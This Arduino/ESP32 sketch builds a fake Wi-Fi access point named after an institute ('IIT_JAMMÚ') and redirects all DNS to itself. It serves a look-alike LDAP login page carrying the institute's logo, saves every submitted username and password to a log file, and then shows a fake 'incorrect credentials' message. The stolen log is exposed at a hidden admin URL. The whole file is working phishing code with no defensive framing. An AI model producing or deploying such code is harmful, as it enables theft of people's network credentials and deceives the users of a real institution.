#include <LittleFS.h>

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>



const byte DNS_PORT = 53;
DNSServer dnsServer;
AsyncWebServer server(80);

// HTML login page
const char* loginHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom right, #4e54c8, #8f94fb);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      text-align: center;
      width: 90%;
      max-width: 320px;
    }
    .logo {
      width: 200px;
      margin-bottom: 20px;
    }
    h2 {
      margin-bottom: 20px;
      color: #4e54c8;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }
    input[type="submit"] {
      background-color: #4e54c8;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }
    input[type="submit"]:hover {
      background-color: #3b3f99;
    }
    .note {
      margin-top: 15px;
      font-size: 12px;
      color: gray;
    }
  </style>
</head>

<body>
  <div class="container">
    <img src="/logo.png" alt="Logo" class="logo"/>
    <h2>Wi-Fi Login Portal</h2>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Username" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <input type="submit" value="Connect">
    </form>
    <div class="note">Login With LDAP. Faster Access WiFi</div>
  </div>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
 

  if (!LittleFS.begin(true)) {
    Serial.println("LITTLEFS Mount Failed");
    return;
  }

  // Start Wi-Fi AP
  WiFi.softAP("IIT_JAMMÚ");

  // Get IP
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);

  // Start DNS server (redirect all domains to our IP)
  dnsServer.start(DNS_PORT, "*", myIP);

  // path for logs
  server.on("/ABC_Admin7901234", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/log.txt", "text/plain");
  });

  server.on("/logo.png", HTTP_GET, [](AsyncWebServerRequest *request){
  request->send(LittleFS, "/iitjlogo.png", "image/png");
  });
  // Serve login page on any request
  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(200, "text/html", loginHTML);
  });

  // Handle login form submission
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
    String username = request->getParam("username", true)->value();
    String password = request->getParam("password", true)->value();

    // Save to log file
    File file = LittleFS.open("/log.txt", FILE_APPEND);
    if (file) {
      file.printf("Username: %s | Password: %s\n", username.c_str(), password.c_str());
      file.close();
    }

    request->send(200, "text/html", "<h2>Incorrect credentials or you are not authorized to use this service. Please try again later.</h2>");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest(); // Handle DNS requests
}
